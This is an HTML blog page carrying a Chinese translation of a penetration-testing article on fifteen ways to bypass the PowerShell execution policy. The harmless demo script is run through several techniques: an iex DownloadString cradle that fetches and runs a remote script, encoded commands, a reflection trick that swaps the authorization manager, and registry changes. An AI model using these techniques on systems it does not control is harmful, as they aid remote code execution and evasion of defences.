@@ -1,0 +1,420 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="utf-8">
+  <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
+  <title>[译] 15-ways-bypass-powershell-exec - Evi1oX</title>
+  <meta name="renderer" content="webkit" />
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"/>
+
+<meta http-equiv="Cache-Control" content="no-transform" />
+<meta http-equiv="Cache-Control" content="no-siteapp" />
+
+<meta name="theme-color" content="#f8f5ec" />
+<meta name="msapplication-navbutton-color" content="#f8f5ec">
+<meta name="apple-mobile-web-app-capable" content="yes">
+<meta name="apple-mobile-web-app-status-bar-style" content="#f8f5ec">
+
+
+<meta name="author" content="Evi1oX" /><meta name="description" content="0x00 概要 原文链接 https://blog.netspi.com/15-ways-to-bypass-the-powershell-execution-policy/ 在Windows上，PowerShell的默认配置是不允许执行脚本文件的。这对于一些渗透测试人员，系统管理员，程序员等来说，" /><meta name="keywords" content="Hugo, theme, even" />
+
+
+
+
+
+
+<meta name="generator" content="Hugo 0.54.0 with theme even" />
+
+
+<link rel="canonical" href="https://04z.net/post/%E8%AF%91-15-way-bypass-powershell-exec/" />
+<link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png">
+<link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png">
+<link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png">
+<link rel="manifest" href="/manifest.json">
+<link rel="mask-icon" href="/safari-pinned-tab.svg" color="#5bbad5">
+
+
+<link href="/dist/even.983f84a7.min.css" rel="stylesheet">
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@3.1.20/dist/jquery.fancybox.min.css" integrity="sha256-7TyXnr2YU040zfSP+rEcz29ggW4j56/ujTPwjMzyqFY=" crossorigin="anonymous">
+
+
+<meta property="og:title" content="[译] 15-ways-bypass-powershell-exec" />
+<meta property="og:description" content="0x00 概要 原文链接 https://blog.netspi.com/15-ways-to-bypass-the-powershell-execution-policy/ 在Windows上，PowerShell的默认配置是不允许执行脚本文件的。这对于一些渗透测试人员，系统管理员，程序员等来说，" />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="https://04z.net/post/%E8%AF%91-15-way-bypass-powershell-exec/" />
+<meta property="article:published_time" content="2017-11-29T18:47:11&#43;00:00"/>
+<meta property="article:modified_time" content="2017-11-29T18:47:11&#43;00:00"/>
+
+<meta itemprop="name" content="[译] 15-ways-bypass-powershell-exec">
+<meta itemprop="description" content="0x00 概要 原文链接 https://blog.netspi.com/15-ways-to-bypass-the-powershell-execution-policy/ 在Windows上，PowerShell的默认配置是不允许执行脚本文件的。这对于一些渗透测试人员，系统管理员，程序员等来说，">
+
+
+<meta itemprop="datePublished" content="2017-11-29T18:47:11&#43;00:00" />
+<meta itemprop="dateModified" content="2017-11-29T18:47:11&#43;00:00" />
+<meta itemprop="wordCount" content="2461">
+
+
+
+<meta itemprop="keywords" content="" />
+<meta name="twitter:card" content="summary"/>
+<meta name="twitter:title" content="[译] 15-ways-bypass-powershell-exec"/>
+<meta name="twitter:description" content="0x00 概要 原文链接 https://blog.netspi.com/15-ways-to-bypass-the-powershell-execution-policy/ 在Windows上，PowerShell的默认配置是不允许执行脚本文件的。这对于一些渗透测试人员，系统管理员，程序员等来说，"/>
+
+<!--[if lte IE 9]>
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/classlist/1.1.20170427/classList.min.js"></script>
+<![endif]-->
+
+<!--[if lt IE 9]>
+  <script src="https://cdn.jsdelivr.net/npm/html5shiv@3.7.3/dist/html5shiv.min.js"></script>
+  <script src="https://cdn.jsdelivr.net/npm/respond.js@1.4.2/dest/respond.min.js"></script>
+<![endif]-->
+
+</head>
+<body>
+  <div id="mobile-navbar" class="mobile-navbar">
+  <div class="mobile-header-logo">
+    <a href="/" class="logo">Evi1oX</a>
+  </div>
+  <div class="mobile-navbar-icon">
+    <span></span>
+    <span></span>
+    <span></span>
+  </div>
+</div>
+<nav id="mobile-menu" class="mobile-menu slideout-menu">
+  <ul class="mobile-menu-list">
+    <a href="/post/friends">
+        <li class="mobile-menu-item">Friends</li>
+      </a>
+  </ul>
+</nav>
+  <div class="container" id="mobile-panel">
+    <header id="header" class="header">
+        <div class="logo-wrapper">
+  <a href="/" class="logo">Evi1oX</a>
+</div>
+
+<nav class="site-navbar">
+  <ul id="menu" class="menu">
+    <li class="menu-item">
+        <a class="menu-item-link" href="/post/friends">Friends</a>
+      </li>
+  </ul>
+</nav>
+    </header>
+
+    <main id="main" class="main">
+      <div class="content-wrapper">
+        <div id="content" class="content">
+          <article class="post">
+    
+    <header class="post-header">
+      <h1 class="post-title">[译] 15-ways-bypass-powershell-exec</h1>
+
+      <div class="post-meta">
+        
+        
+        
+      </div>
+    </header>
+
+    <div class="post-toc" id="post-toc">
+  <h2 class="post-toc-title">Contents</h2>
+  <div class="post-toc-content">
+    <nav id="TableOfContents">
+<ul>
+<li><a href="#0x00-概要">0x00 概要</a></li>
+<li><a href="#0x01-什么是powershell执行策略">0x01 什么是PowerShell执行策略</a></li>
+<li><a href="#0x02-为什么我想绕过执行策略">0x02 为什么我想绕过执行策略</a></li>
+<li><a href="#0x03-如何察看当前安全策略">0x03 如何察看当前安全策略</a></li>
+<li><a href="#0x04-实验环境设置">0x04 实验环境设置</a></li>
+<li><a href="#0x05-15种绕过方式">0x05 15种绕过方式</a>
+<ul>
+<li><a href="#1-将你的脚本内容粘贴到一个交互式的powershell窗口中">1. 将你的脚本内容粘贴到一个交互式的PowerShell窗口中</a></li>
+<li><a href="#2-echo脚本内容-然后pipe到powershell的标准输入中">2. Echo脚本内容，然后Pipe到PowerShell的标准输入中</a></li>
+<li><a href="#3-从一个文件中读取脚本-然后pipe到powershell的标准输入中">3. 从一个文件中读取脚本，然后Pipe到PowerShell的标准输入中</a></li>
+<li><a href="#4-从一个url-download脚本内容-然后执行">4. 从一个URL Download脚本内容，然后执行</a></li>
+<li><a href="#5-使用-command命令参数">5. 使用-command命令参数</a></li>
+<li><a href="#6-使用-encodedcommand命令参数">6. 使用-encodedCommand命令参数</a></li>
+<li><a href="#7-使用invoke-command-命令">7. 使用Invoke-Command 命令</a></li>
+<li><a href="#8-使用-invoke-expression-命令">8. 使用 Invoke-Expression 命令</a></li>
+<li><a href="#9-使用bypass执行策略标志">9. 使用Bypass执行策略标志</a></li>
+<li><a href="#10-使用unrestricted执行策略标志">10. 使用Unrestricted执行策略标志</a></li>
+<li><a href="#11-使用remote-signed执行策略标志">11. 使用Remote-Signed执行策略标志</a></li>
+<li><a href="#12-通过换出认证管理器-禁用执行策略">12. 通过换出认证管理器，禁用执行策略</a></li>
+<li><a href="#13-设置执行策略为process作用域">13. 设置执行策略为Process作用域</a></li>
+<li><a href="#14-通过命令设置执行策略为currentuser作用域">14. 通过命令设置执行策略为CurrentUser作用域</a></li>
+<li><a href="#15-通过注册表设置执行策略为currentuser作用域">15. 通过注册表设置执行策略为CurrentUser作用域</a></li>
+</ul></li>
+<li><a href="#0x06-总结">0x06 总结</a></li>
+<li><a href="#0x07-参考资料">0x07 参考资料</a></li>
+</ul>
+</nav>
+  </div>
+</div>
+    <div class="post-content">
+      
+
+<h1 id="0x00-概要">0x00 概要</h1>
+
+<p><br><br />
+<strong>原文链接</strong> <a href="https://blog.netspi.com/15-ways-to-bypass-the-powershell-execution-policy/">https://blog.netspi.com/15-ways-to-bypass-the-powershell-execution-policy/</a></p>
+
+<p>在Windows上，PowerShell的默认配置是不允许执行脚本文件的。这对于一些渗透测试人员，系统管理员，程序员等来说，是一个必须面对的障碍。本文中，我将提出15种不需要本地管理员权限就绕过该执行保护策略的方法。我确定依然有许多甚至我不知道的方法没有提到，但是我希望本文对那些需要的人来说是一个良好的开端。</p>
+
+<h1 id="0x01-什么是powershell执行策略">0x01 什么是PowerShell执行策略</h1>
+
+<p>PowerShell执行策略是用来限制哪些类型的PowerShell脚本能在系统上直接运行。默认它的设置时Restricted，即任何脚本都不行。但是，我们需要明确该设置从来都没打算设计成为一个安全控制策略，相反，它本来是为了防止系统管理员发生搬起石头砸自己的脚的情况。这就是为什么有许多围绕它的选项。其中包括一些微软自身提供的。若想了解更多PowerShell的执行策略设置和其他默认安全设置，我推荐你读<a href="https://www.darkoperator.com/blog/2013/3/5/powershell-basics-execution-policy-part-1.html">Carlos Perez</a>的博客，它提供了一个比较全面的概述。</p>
+
+<h1 id="0x02-为什么我想绕过执行策略">0x02 为什么我想绕过执行策略</h1>
+
+<p>为什么PowerShell如此流行，我听到过不少的答案，最常听到就是它可以实现自动化，以下是一些管理员，渗透测试人员，黑客之所以喜欢它的一些原因：</p>
+
+<blockquote>
+<p>是Windows原生的<br />
+可以调用Windows API<br />
+不需要写入磁盘就可以执行命令<br />
+可以逃避Anti-Virus的检测<br />
+被大多数程序加入白名单中，标记为可信的<br />
+有许多开源的渗透工具集</p>
+</blockquote>
+
+<h1 id="0x03-如何察看当前安全策略">0x03 如何察看当前安全策略</h1>
+
+<p>在使用PowerShell的所有惊奇的特性前，攻击者要做的第一件事就是绕过Restricted执行策略。可以通过命令Get-ExectionPolicy来获得当前策略。如果你是第一次使用这个命令，则应该是设置为Restricted的，如下：</p>
+
+<p><code>PS C:\&gt; Get-ExecutionPolicy</code><br />
+<img src="https://img.04z.net/img/Powershell_Bypass_1.png" alt="图片已损坏" /></p>
+
+<p>同样可以将执行策略设置为不同的级别。如下查看支持的所有级别，若想了解更多关于<strong>Set-ExecutionPolicy</strong>的信息，查看 <a href="https://msdn.microsoft.com/powershell/reference/5.1/microsoft.powershell.security/Set-ExecutionPolicy">Set-ExecutionPolicy</a></p>
+
+<p><code>PS C:\&gt; Get-ExecutionPolicy -List | Format-Table -AutoSize</code><br />
+ <img src="https://img.04z.net/img/Powershell_Bypass_2.png" alt="图片已损坏" /></p>
+
+<h1 id="0x04-实验环境设置">0x04 实验环境设置</h1>
+
+<p>我会使用如下一个脚本来作为例子,<code>runme.ps1</code>，该明白用来向控制台输出一句话：</p>
+
+<p><code>Write-Host &quot;My voice is my passport, verify me.&quot;</code><br />
+当我在默认策略的主机上，尝试执行该脚本时，会出现如下错误：<br />
+<img src="https://img.04z.net/img/Powershell_Bypass_3.png" alt="图片已损坏" /><br />
+如果你的策略太open，你想使用更严格的方式来测试如下的方案，你需要切换到管理员身份，执行<code>Set-ExecutionPolicy Restricted。OK</code>，接下来是15种方式：</p>
+
+<h1 id="0x05-15种绕过方式">0x05 15种绕过方式</h1>
+
+<h2 id="1-将你的脚本内容粘贴到一个交互式的powershell窗口中">1. 将你的脚本内容粘贴到一个交互式的PowerShell窗口中</h2>
+
+<p>如下，将你的脚本粘贴到console中。但是，你要记住，你的受限程度取决于你当前用户的权限。假如你有一个可以交互式的窗口，则这是最基本的一种方法，而且不需要做任何的配置改变和写入到磁盘中。<br />
+<img src="https://img.04z.net/img/Powershell_Bypass_4.png" alt="图片已损坏" /></p>
+
+<h2 id="2-echo脚本内容-然后pipe到powershell的标准输入中">2. Echo脚本内容，然后Pipe到PowerShell的标准输入中</h2>
+
+<p><code>Echo Write-Host &quot;My voice is my passport, verify me.&quot;  | PowerShell.exe -noprofile -</code><br />
+<img src="https://img.04z.net/img/Powershell_Bypass_5.png" alt="图片已损坏" /></p>
+
+<h2 id="3-从一个文件中读取脚本-然后pipe到powershell的标准输入中">3. 从一个文件中读取脚本，然后Pipe到PowerShell的标准输入中</h2>
+
+<p>此方法有个缺点就是会写入脚本到本地磁盘中，但是你可以从一个网络共享中读取脚本，来避免写内容到磁盘中。</p>
+
+<p><code>PS C:\temp&gt; Get-Content .\runme.ps1 | powershell.exe -noprofile -</code><br />
+<img src="https://img.04z.net/img/Powershell_Bypass_6.png" alt="图片已损坏" /></p>
+
+<p>PS C:\temp&gt; Type .\runme.ps1 | powershell.exe -noprofile -<br />
+<img src="https://img.04z.net/img/Powershell_Bypass_7.png" alt="图片已损坏" /></p>
+
+<h2 id="4-从一个url-download脚本内容-然后执行">4. 从一个URL Download脚本内容，然后执行</h2>
+
+<p><code>PS C:\temp&gt; powershell -nop -c &quot;iex(New-Object Net.WebClient).DownloadString('http://192.168.1.2/runme.ps1')&quot;</code><br />
+<img src="https://img.04z.net/img/Powershell_Bypass_8.png" alt="图片已损坏" /></p>
+
+<h2 id="5-使用-command命令参数">5. 使用-command命令参数</h2>
+
+<p>此方法和直接粘贴脚本内容执行的方式很像，但是此方法不需要一个交互式的窗口。它适用于简单脚本的执行，对于复杂脚本会发生解析错误。该方法同样不会写内容到磁盘中。</p>
+
+<p><code>powershell -command &quot;Write-Host 'My voice is my passport, verify me.'&quot;</code><br />
+ <img src="https://img.04z.net/img/Powershell_Bypass_9.png" alt="图片已损坏" /><br />
+你可以将该命令写到一个bat文件中，然后放到启动目录中，来帮助提权。</p>
+
+<h2 id="6-使用-encodedcommand命令参数">6. 使用-encodedCommand命令参数</h2>
+
+<p>该方法和上一个方法很相似，但是此方式脚本内容是Unicode/base64 encode的字符串。使用编码的好处是可以让你避免执行使用Command参数时产生一些糟糕的解析问题。以下的例子是摘自Posh-SecMod。该工具套件还包括一个小的压缩方法来减少由于encode后字符串太长的情况。</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><span class="lnt">1
+</span></pre></td>
+<td class="lntd">
+<pre class="chroma">$command = &#34;Write-Host &#39;My voice is my passport, verify me.&#39;&#34; $bytes = [System.Text.Encoding]::Unicode.GetBytes($command) $encodedCommand = [Convert]::ToBase64String($bytes) powershell.exe -EncodedCommand $encodedCommand</pre></td></tr></table>
+</div>
+</div>
+<p><img src="https://img.04z.net/img/Powershell_Bypass_10.png" alt="图片已损坏" /></p>
+
+<h2 id="7-使用invoke-command-命令">7. 使用Invoke-Command 命令</h2>
+
+<p>该方法最cool点在于对抗那些PowerShell remoting开启的Remote系统。</p>
+
+<p><code>invoke-command -scriptblock {Write-Host &quot;My voice is my passport, verify me.&quot;}</code><br />
+<img src="https://img.04z.net/img/Powershell_Bypass_11.png" alt="图片已损坏" /><br />
+如下命令，可用来从一个远程系统上抓取执行策略同时运用到本地计算机中.</p>
+
+<p><code>invoke-command -computername Server01 -scriptblock {get-executionpolicy} | set-executionpolicy -force</code></p>
+
+<h2 id="8-使用-invoke-expression-命令">8. 使用 Invoke-Expression 命令</h2>
+
+<p><code>PS C:\temp&gt; Get-Content ./runme.ps1 | Invoke-ExpressionPS C:\temp&gt; gc .\runme.ps1 | iex(短命令格式)</code><br />
+ <img src="https://img.04z.net/img/Powershell_Bypass_12.png" alt="图片已损坏" /></p>
+
+<h2 id="9-使用bypass执行策略标志">9. 使用Bypass执行策略标志</h2>
+
+<p>这个方法是微软提供的用来绕过执行策略的一种方式。当指定该标志后，即视为什么都不做，什么警告也不提示。</p>
+
+<p><code>powershell -ExecutionPolicy bypass -File ./runme.ps1</code><br />
+<img src="https://img.04z.net/img/Powershell_Bypass_13.png" alt="图片已损坏" /></p>
+
+<h2 id="10-使用unrestricted执行策略标志">10. 使用Unrestricted执行策略标志</h2>
+
+<p>该标志和bypass很像，但是当使用该标志时，即意味着加载所有的配置文件和执行所有的脚本。如果你运行一个从网上下载的未签名的脚本，会给出权限提示。</p>
+
+<p><code>powershell -ExecutionPolicy unrestricted -File ./runme.ps1</code><br />
+<img src="https://img.04z.net/img/Powershell_Bypass_14.png" alt="图片已损坏" /></p>
+
+<h2 id="11-使用remote-signed执行策略标志">11. 使用Remote-Signed执行策略标志</h2>
+
+<p>创建你的脚本，然后按<a href="https://www.darkoperator.com/blog/2013/3/5/powershell-basics-execution-policy-part-1.html">指南签名</a>。最后运行:</p>
+
+<p><code>PowerShell.exe -ExecutionPolicy Remote-signed -File .runme.ps1</code></p>
+
+<h2 id="12-通过换出认证管理器-禁用执行策略">12. 通过换出认证管理器，禁用执行策略</h2>
+
+<p>非常有创造性的一个。如下函数可以在交互式窗口中使用，也可以在Command参数中指定。一旦该函数被执行，则会换出认证管理器，同时默认策略改为unrestricted。但是该方法只在一个会话范围内有效。</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code class="language-powershell" data-lang="powershell"><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-powershell" data-lang="powershell"><span class="k">function</span> <span class="nb">Disable-ExecutionPolicy</span> <span class="p">{(</span><span class="nv">$ctx</span> <span class="p">=</span> <span class="nv">$executioncontext</span><span class="p">.</span><span class="n">gettype</span><span class="p">().</span><span class="n">getfield</span><span class="p">(</span><span class="s2">&#34;_context&#34;</span><span class="p">,</span><span class="s2">&#34;nonpublic,instance&#34;</span><span class="p">).</span><span class="n">getvalue</span><span class="p">(</span> <span class="nv">$executioncontext</span><span class="p">)).</span><span class="n">gettype</span><span class="p">().</span><span class="n">getfield</span><span class="p">(</span><span class="s2">&#34;_authorizationManager&#34;</span><span class="p">,</span><span class="s2">&#34;nonpublic,instance&#34;</span><span class="p">).</span><span class="n">setvalue</span><span class="p">(</span><span class="nv">$ctx</span><span class="p">,</span> <span class="p">(</span><span class="nb">new-object</span> <span class="n">System</span><span class="p">.</span><span class="n">Management</span><span class="p">.</span><span class="n">Automation</span><span class="p">.</span><span class="n">AuthorizationManager</span> <span class="s2">&#34;Microsoft.PowerShell&#34;</span><span class="p">))}</span>  <span class="nb">Disable-ExecutionPolicy</span>  <span class="p">./</span><span class="n">runme</span><span class="p">.</span><span class="n">ps1</span></code></pre></td></tr></table>
+</div>
+</div>
+<p><img src="https://img.04z.net/img/Powershell_Bypass_15.png" alt="图片已损坏" /></p>
+
+<h2 id="13-设置执行策略为process作用域">13. 设置执行策略为Process作用域</h2>
+
+<p>我们之前介绍中提到过，执行策略可以应用到过个级别。其中就包括你完全控制的process。使用该方法仅限于当前session中，执行策略会变为unrestricted。</p>
+
+<p><code>Set-ExecutionPolicy Bypass -Scope Process</code><br />
+<img src="https://img.04z.net/img/Powershell_Bypass_16.png" alt="图片已损坏" /></p>
+
+<h2 id="14-通过命令设置执行策略为currentuser作用域">14. 通过命令设置执行策略为CurrentUser作用域</h2>
+
+<p><code>Set-Executionpolicy -Scope CurrentUser -ExecutionPolicy UnRestricted</code><br />
+<img src="https://img.04z.net/img/Powershell_Bypass_17.png" alt="图片已损坏" /></p>
+
+<h2 id="15-通过注册表设置执行策略为currentuser作用域">15. 通过注册表设置执行策略为CurrentUser作用域</h2>
+
+<p>该方法和Process作用域方法很相似，但是通过修改注册表Key可将设置持续应用到当前用户的环境中。</p>
+
+<p><code>HKEY_CURRENT_USER\Software\Microsoft\PowerShell\1\ShellIds\Microsoft.PowerShell</code><br />
+<img src="https://img.04z.net/img/Powershell_Bypass_18.png" alt="图片已损坏" /></p>
+
+<h1 id="0x06-总结">0x06 总结</h1>
+
+<p>该主题的目的是为了让执行策略不再成为程序员，管理员或渗透测试人员的一个障碍。微软同样也没有打算将其设置为一个安全控制。这就是为什么有如此多的方法来绕过它。微软也提供了一些本地选项，安全社区中同样有许多有意思的tricks。最后，祝在PowerShell冒险中好运，别忘了为你的Hack行为负责。</p>
+
+<hr />
+
+<h1 id="0x07-参考资料">0x07 参考资料</h1>
+
+<hr />
+
+<p><a href="http://blogs.msdn.com/b/powershell/archive/2008/09/30/powershell-s-security-guiding-principles.aspx">http://blogs.msdn.com/b/powershell/archive/2008/09/30/powershell-s-security-guiding-principles.aspx</a></p>
+
+<p><a href="http://obscuresecurity.blogspot.com/2011/08/powershell-executionpolicy.html">http://obscuresecurity.blogspot.com/2011/08/powershell-executionpolicy.html</a></p>
+
+<p><a href="http://roo7break.co.uk/?page_id=611">http://roo7break.co.uk/?page_id=611</a></p>
+
+<p><a href="http://technet.microsoft.com/en-us/library/hh849694.aspx">http://technet.microsoft.com/en-us/library/hh849694.aspx</a></p>
+
+<p><a href="http://technet.microsoft.com/en-us/library/hh849812.aspx">http://technet.microsoft.com/en-us/library/hh849812.aspx</a></p>
+
+<p><a href="http://technet.microsoft.com/en-us/library/hh849893.aspx">http://technet.microsoft.com/en-us/library/hh849893.aspx</a></p>
+
+<p><a href="http://www.darkoperator.com/blog/2013/3/21/powershell-basics-execution-policy-and-code-signing-part-2.html">http://www.darkoperator.com/blog/2013/3/21/powershell-basics-execution-policy-and-code-signing-part-2.html</a></p>
+
+<p><a href="http://www.hanselman.com/blog/SigningPowerShellScripts.aspx">http://www.hanselman.com/blog/SigningPowerShellScripts.aspx</a></p>
+
+<p><a href="http://www.darkoperator.com/blog/2013/3/5/powershell-basics-execution-policy-part-1.html">http://www.darkoperator.com/blog/2013/3/5/powershell-basics-execution-policy-part-1.html</a></p>
+
+<p><a href="http://www.nivot.org/blog/post/2012/02/10/Bypassing-Restricted-Execution-Policy-in-Code-or-in-Scriptfrom">http://www.nivot.org/blog/post/2012/02/10/Bypassing-Restricted-Execution-Policy-in-Code-or-in-Scriptfrom</a></p>
+
+<p><a href="http://www.powershellmagazine.com/2014/07/08/powersploit/">http://www.powershellmagazine.com/2014/07/08/powersploit/</a></p>
+
+    </div>
+
+    
+<footer class="post-footer">
+      
+      <nav class="post-nav">
+        <a class="prev" href="/post/download-remote-payload-and-exec/">
+            <i class="iconfont icon-left"></i>
+            <span class="prev-text nav-default">Download Payload AND Exec</span>
+            <span class="prev-text nav-mobile">Prev</span>
+          </a>
+        <a class="next" href="/post/udf-attack/">
+            <span class="next-text nav-default">UDF-AttacK</span>
+            <span class="next-text nav-mobile">Next</span>
+            <i class="iconfont icon-right"></i>
+          </a>
+      </nav>
+    </footer>
+  </article>
+        </div>
+        
+
+  
+
+  
+
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      
+    </footer>
+
+    <div class="back-to-top" id="back-to-top">
+      <i class="iconfont icon-up"></i>
+    </div>
+  </div>
+  
+  <script src="https://cdn.jsdelivr.net/npm/jquery@3.2.1/dist/jquery.min.js" integrity="sha256-hwg4gsxgFZhOsEEamdOYGBf13FyQuiTwlAQgxVSNgt4=" crossorigin="anonymous"></script>
+  <script src="https://cdn.jsdelivr.net/npm/slideout@1.0.1/dist/slideout.min.js" integrity="sha256-t+zJ/g8/KXIJMjSVQdnibt4dlaDxc9zXr/9oNPeWqdg=" crossorigin="anonymous"></script>
+  <script src="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@3.1.20/dist/jquery.fancybox.min.js" integrity="sha256-XVLffZaxoWfGUEbdzuLi7pwaUJv1cecsQJQqGLe7axY=" crossorigin="anonymous"></script>
+<script type="text/javascript" src="/dist/even.ae3e3272.min.js"></script>
+  <script type="text/javascript">
+    window.MathJax = {
+      tex2jax: {inlineMath: [['$','$'], ['\\(','\\)']]},
+      showProcessingMessages: false,
+      messageStyle: 'none'
+    };
+  </script>
+  <script async src="https://cdn.jsdelivr.net/npm/mathjax@2.7.5/MathJax.js?config=TeX-MML-AM_CHTML"  integrity="sha256-nvJJv9wWKEm88qvoQl9ekL2J+k/RWIsaSScxxlsrv8k=" crossorigin="anonymous"></script>
+
+
+<script type="application/javascript">
+var doNotTrack = false;
+if (!doNotTrack) {
+	window.ga=window.ga||function(){(ga.q=ga.q||[]).push(arguments)};ga.l=+new Date;
+	ga('create', 'UA-153178075-1', 'auto');
+	ga('set', 'anonymizeIp', true);
+	ga('send', 'pageview');
+}
+</script>
+<script async src='https://www.google-analytics.com/analytics.js'></script>
+
+
+
+
+
+
+
+</body>
+</html>
